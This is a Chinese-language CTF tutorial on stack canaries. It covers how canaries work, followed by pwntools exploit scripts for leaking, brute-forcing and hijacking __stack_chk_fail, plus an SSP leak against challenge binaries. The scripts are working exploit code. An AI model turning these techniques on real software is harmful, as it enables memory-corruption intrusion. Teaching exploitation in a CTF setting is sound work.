# Bypass Canary


## Canary原理
canary是一种防止栈溢出的防护手段, 即在stack overflow发生的高危区域的尾部插入一个随机值, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack buffer overflow是否发生。如果是，则说明发生了栈溢出，程序停止运行

Canary与windows下的GS保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。

### GCC使用Canary
```c
-fstack-protector           //启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all       //启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit  //只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector        //禁用保护
```

### Canary实现原理
开启Canary保护的stack结构大概如下（64位）

![](/BypassCanary.assets/canary.png)

当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存放在栈中ebp-0x8的位置。 这个操作即为向栈中插入Canary值
```c
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```
在函数返回之前，会将该值取出，并与fs:0x28的值进行异或。如果抑或的结果为0，说明canary未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。
```c
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```
如果canary已经被非法修改，此时程序流程会走到stack_chk_fail。stack_chk_fail也是位于glibc中的函数，默认情况下经过ELF的延迟绑定，定义如下。（这意味可以通过劫持stack_chk_fail的got值劫持流程或者利用stack_chk_fail泄漏内容）
```c
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```
进一步，对于Linux来说，fs寄存器实际指向的是当前栈的TLS结构，fs:0x28指向的正是stack_guard。 
```c
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```
如果存在溢出可以覆盖位于TLS中保存的Canary值那么就可以实现绕过保护机制。

事实上，TLS中的值由函数security_init进行初始化。
```c
static void
security_init (void)
{
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```
**以上来源与[CTF-WIKI](https://wiki.x10sec.org/pwn/mitigation/Canary/)**
<br/>

## Canary绕过
Canary是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着Canary就能够阻止所有的栈溢出利用，在这里给出了常见的存在Canary的栈溢出利用思路，请注意每种方法都有特定的环境要求。

### 覆盖\x00泄露Canary
Canary设计为以字节"\x00"结尾，本意是为了保证Canary可以截断字符串。 泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露Canary，之后再次溢出控制执行流程。

源码如下
```c
// ex1.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
int main(void) {
    int i;
    init();
    char buf[100];
    for(i=0;i<2;i++){
        scanf("%s",&buf);
        printf(buf);
    }
    return 0;
}
```
编译成32位
```c
gcc -m32 -no-pie ex2.c -o ex2
```
思路：通过覆盖Canary最后一个"\x00"字节来打印出4位的Canary 之后，计算好偏移，将Canary填入到相应的溢出位置，实现Ret到getshell函数

用GDB调试，在vuln下一个断点，根据汇编知道 EAX 存储的就是 Canary 的值

![](/BypassCanary.assets/ex2_1.png) 
用 n 让程序执行到输入字符，查看栈空间。可以看到输入的字符到 Canary 相差了 `0x7c-0x18=0x64` 个字节

![](/BypassCanary.assetsex2_2.png) 

知道了距离就可以覆盖掉 Canary 的最低位，用回车（0xa）将0x00 覆盖掉，剩下的高字节信息就会泄露，然后将泄露出来的 Canary 填回去，再通过栈溢出把返回地址覆盖成getshell函数的地址
```python
from pwn import *

p=process("./ex2")
elf=ELF("./ex2")
getshell=elf.sym['getshell']

payload='a'*0x63+ 'b'
p.sendline(payload)
p.recvuntil('ab')

canary=u32(p.recv(4)) - 0xa
print ("canary: ",canary)

payload = 'a'*0x64 + p32(canary) + 'a'*8  + 'a'*4  +p32(getshell)
# padding1 + canary + padding2 + old_ebp + ret_addr
p.send(payload)

p.interactive()
```

### 格式化字符串泄露Canary
**[题目地址 bin](bin)**，利用格式化字符串漏洞来泄露 canary 的值，从而绕过 canary 保护。

用IDA找到main函数，printf存在格式化字符串漏洞
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format; // [esp+6h] [ebp-12h]
  unsigned int v5; // [esp+Ch] [ebp-Ch]  //canary

  v5 = __readgsdword(0x14u);
  init();
  __isoc99_scanf("%6s", &format);
  printf(&format);  //格式化字符串漏洞
  fun();
  return 0;
}
```
跟进fun函数，read存在栈溢出漏洞
```c
unsigned int fun()
{
  char buf; // [esp+8h] [ebp-70h]
  unsigned int v2; // [esp+6Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  read(0, &buf, 0x78u);  //栈溢出漏洞
  return __readgsdword(0x14u) ^ v2; 
}
```
而且程序存在getflag的后门函数
```c
unsigned int getflag()
{
  FILE *stream; // [esp+4h] [ebp-74h]
  char s; // [esp+8h] [ebp-70h]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  stream = fopen("./flag", "r");
  if ( !stream )
    puts("get flag error");
  fgets(&s, 100, stream);
  puts(&s);
  return __readgsdword(0x14u) ^ v3;
}
```
思路：利用格式化字符串漏洞打印 canary ，再通过栈溢出来getflag

用GDB调试程序，找到 canary 的值

![](/BypassCanary.assets/bin_1.png) 

让程序执行到输入字符，查看栈空间，可以看到 canary 在格式化字符串的偏移为7
![](/BypassCanary.assets/bin_2.png) 

通过第一次输入执行格式化字符串漏洞，泄露出 canary ，第二次输入执行栈溢出从而getflag
```python
#!coding:utf-8
from pwn import *
#context.log_level='debug'

p=process("./bin")
getflag=0x0804863B

payload='%7$x'
p.sendline(payload)

canary=int(p.recv(),16)
print ("canary: ",hex(canary))

payload='a'*(0x70-0xc)+p32(canary)+'a'*(0xc-0x4)+'a'*0x4+p32(getflag)
#pading1 + canary + pading2 +old_ebp + ret_addr
p.sendline(payload)

p.interactive()
```

### 爆破Canary
对于Canary，不仅每次进程重启后的Canary不同(相比GS，GS重启后是相同的)，而且同一个进程中的每个线程的Canary也不同。 但是存在一类通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，因此每次创建的子进程的Canary是相同的。我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。

**[题目地址 bin1](bin1)**，因为 canary 最低位是\x00 。所以对于32位来说，只需要爆破3位，而64位则需要爆破7位。每位的数值范围是（0x0-0xFF）

用IDA分析，程序开启了 canary，而且还有fork函数，可以爆破 canary
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // [esp+Ch] [ebp-Ch]

  init();
  while ( 1 )
  {
    v3 = fork();  //创建的子进程的Canary是相同的
    if ( v3 < 0 )
      break;
    if ( v3 )
    {
      wait(0);
    }
    else
    {
      puts("welcome");
      fun();
      puts("recv sucess");
    }
  }
  puts("fork error");
  exit(0);
}
```
fun函数同样存在栈溢出，而且还有后门函数。
```c
unsigned int fun()
{
  char buf; // [esp+8h] [ebp-70h]
  unsigned int v2; // [esp+6Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  read(0, &buf, 0x78u);  //栈溢出
  return __readgsdword(0x14u) ^ v2;
}
```
思路：爆破 canary ，然后进行栈溢出，将得到的 canary 填回去，从而getflag
```python
from pwn import *

p=process("./bin1")
context.log_level='debug'
getflag=0x0804863B

p.recvuntil("welcome\n")

# Brute force canary 
canary='\x00'
for i in range(3):
	for j in range(256):
		payload='a'*(0x70-0xc)+canary+chr(j)
		p.send(payload)
		text = p.recvuntil("welcome\n")
		if "recv" in text:
			canary += chr(j)
			break

payload='a'*(0x70-0xc)+canary+'a'*(0xc-0x4)+'a'*0x4+p32(getflag)
p.sendline(payload)

p.interactive()
```

### 劫持__stack_chk_fail函数
Canary失败的处理逻辑会进入到 \__stack_chk_failed函数，\__stack_chk_failed函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。

**[题目地址 r2t4](r2t4)** 

可以看到程序存在栈溢出和格式化字符串漏洞
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-30h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  read(0, &buf, 0x38uLL); //栈溢出
  printf(&buf, &buf);     //格式化字符串漏洞
  return 0;
}
```
程序还存在后门函数
```c
unsigned __int64 backdoor()
{
  unsigned __int64 v0; // ST08_8

  v0 = __readfsqword(0x28u);
  system("cat flag");
  return __readfsqword(0x28u) ^ v0;
}
```
思路：利用格式化字符串漏洞把 __stack_chk_failed 的got表改成 backdoor 的地址。然后故意触发 __stack_chk_failed ，从而执行 backdoor
```python
from pwn import *

p=process("./r2t4")
elf=ELF("./r2t4")
context(arch='amd64',os='linux',log_level='debug')

backdoor=0x400626
__stack_chk_fail=elf.got["__stack_chk_fail"]

payload='%64c%9$hn%1510c%10$hnAAA' + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)
p.sendline(payload)

p.interactive() 
```
backdoor的地址是0x400626，利用格式化字符串漏洞把 \__stack_chk_fail 的地址覆盖掉
`%64c`：0x40，替换backdoor的两位高字节0x0040
`%64c%9$hn%1510c%10$hnAAA`：占24个字符，24/8=3，偏移为6+3=9
`$hn`：向某个地址写入双字节
`%1510c`：1510+64=0x0626,替换backdoor的两位高字节0x0626
`AAA`：是填充字符，填充到8的倍数
`__stack_chk_fail+2`和`__stack_chk_fail`分别替换成backdoor的高两位字节和低两位字节

<br/>

**[题目地址 bin3](bin3)** 

同样也是利用格式化字符串漏洞来劫持 __stack_chk_fail 
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format; // [rsp+0h] [rbp-60h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  read_n(&format, 88LL); 
  printf(&format);
  return 0;
} 
```
利用代码如下：
```python
#!coding:utf-8
from pwn import *

p=process("./bin3")
elf=ELF("./bin3")
backddor=0x40084E
stack_fail = elf.got['__stack_chk_fail']

payload='%64c%9$hn%2062c%10$hnAAA' + p64(stack_fail+2) + p64(stack_fail)
# 将stack_chk_fial 用格式化字符串漏洞 替换成 backdoor 的地址
payload+='a'*(0x68-len(payload))
# 故意覆盖掉canary 触发stack_chk_fail

p.recv()
p.sendline(payload)

p.interactive()
```

### SSP Leak
SSP（Stack Smashing Protect）Leak ，在canary被修改之后，程序会执行 __stack_chk_fail 然后报错，打印argv[0]这个指针指向的字符串，而argv[0]默认情况下是程序的名字，如果我们把它覆盖成想要的地址，那么就可以实现任意地址读了
```c
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>"); 
}
```

**[题目地址 bin2](bin2)** 
```c
unsigned __int64 sub_4007E0()
{
  __int64 v0; // rbx
  int v1; // eax
  __int64 v3; // [rsp+0h] [rbp-128h]
  unsigned __int64 v4; // [rsp+108h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "Hello!\nWhat's your name? ");
  if ( !_IO_gets(&v3) )
LABEL_9:
    _exit(1);
  v0 = 0LL;
  __printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v1 = _IO_getc(stdin);
    if ( v1 == -1 )
      goto LABEL_9;
    if ( v1 == 10 )
      break;
    byte_600D20[v0++] = v1;
    if ( v0 == 32 )
      goto LABEL_8;
  }
  memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0)); //修改flag地址
LABEL_8:
  puts("Thank you, bye!");
  return __readfsqword(0x28u) ^ v4;
}
```
flag在服务器上，而且看IDA反编译的伪代码，存放flag的地址被修改了

<img src="/BypassCanary.assets/bin2_1.png"/>

这里有一个小trick：`ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射`

这就意味着flag可能不止存放在一个地址里，可以用GDB调试找到flag的地址


![](/BypassCanary.assets/bin2_2.png)

在 __IO_gets 下个断点，查看输入的地址和 argv[0] 的地址相差的距离 `0xde78-0xdc60=0X218`

![](/BypassCanary.assets/bin2_3.png) 知道了偏移就可以把 argv[0] 覆盖成存放 flag 的地址，从而读取 flag
```python
from pwn import *

#p=process("./bin2")
p=remote('pwn.jarvisoj.com',9877)
flag_addr=0x400d21

p.recvuntil("What's your name?")
payload='a'*0x218+p64(flag_addr)
p.sendline(payload)

p.recvuntil("Please overwrite the flag: ")
p.sendline("1")

p.interactive()
```

### 覆盖TLS中储存的Canary
已知Canary储存在TLS中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的Canary和TLS储存的Canary实现绕过。

先挖个坑，留着以后填


## 参考
[CTF-WIKI Canary](https://wiki.x10sec.org/pwn/mitigation/Canary/)

[canary的各种姿势----pwn题解版 ](https://xz.aliyun.com/t/4657)

